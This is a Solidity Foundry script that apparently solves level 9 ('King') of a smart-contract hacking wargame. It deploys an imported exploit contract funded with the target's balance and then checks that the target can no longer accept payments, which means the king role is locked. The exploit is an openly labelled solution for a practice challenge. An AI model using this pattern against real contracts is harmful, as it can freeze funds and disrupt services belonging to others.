pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {KingExploit} from "../src/Level09Exploit.sol";

contract Level09Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target) private {
        new KingExploit{value: _target.balance}(payable(_target));
    }

    function levelDone(address _target) private returns (bool) {
        (bool ok,) = payable(_target).call{value: address(_target).balance}("");
        return !ok;
    }
}
